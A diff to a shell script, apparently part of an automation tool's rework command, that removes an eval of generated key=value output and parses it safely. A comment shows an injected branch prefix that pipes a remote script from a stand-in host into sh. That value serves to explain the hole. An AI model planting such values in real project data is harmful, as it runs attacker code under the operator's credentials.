@@ -312,7 +312,29 @@ qx_rework_target() {           # qx_rework_target <task-json> <branch-prefix>
 }
 # ── end quetrex:exec-block qx_rework_target ───────────────────────────────────
 
-eval "$(qx_rework_target "$TASK" "$BRANCH_PREFIX" | sed 's/^/QX_/')" || exit 1
+# NO eval. This line used to be:
+#     eval "$(qx_rework_target "$TASK" "$BRANCH_PREFIX" | sed 's/^/QX_/')"
+# qx_rework_target emits raw `BASE=<prefix><epic>` lines, so a branchPrefix carrying a
+# shell metacharacter — `claude/;curl evil.sh|sh` — became a command the eval ran. It is
+# reached on the epic-child path this command exists to serve, inside an unattended cloud
+# routine holding the operator's credentials, and every fixture used the benign `claude/`
+# so nothing exercised it. branchPrefix is read from .quetrex/project.json, which is
+# committed data anyone with repo write access controls.
+# Parsing the key/value lines directly needs no eval at all, so no quoting scheme has to
+# be got right: a value can never be executed because it is never part of a command.
+QX_KIND=""; QX_BASE=""; QX_EPIC=""
+_qx_rework_out="$(qx_rework_target "$TASK" "$BRANCH_PREFIX")" || exit 1
+while IFS='=' read -r _k _v; do
+  case "$_k" in
+    KIND) QX_KIND="$_v" ;;
+    BASE) QX_BASE="$_v" ;;
+    EPIC) QX_EPIC="$_v" ;;
+  esac
+done <<EOF
+$_qx_rework_out
+EOF
+unset _qx_rework_out _k _v
+[ -n "$QX_KIND" ] || { echo "rework: could not resolve the target kind for $TASK_ID" >&2; exit 1; }
 BASE_BRANCH="$QX_BASE"
 echo "Rework target: $TASK_ID  kind=$QX_KIND  base=$BASE_BRANCH  epic=$QX_EPIC"
 ```
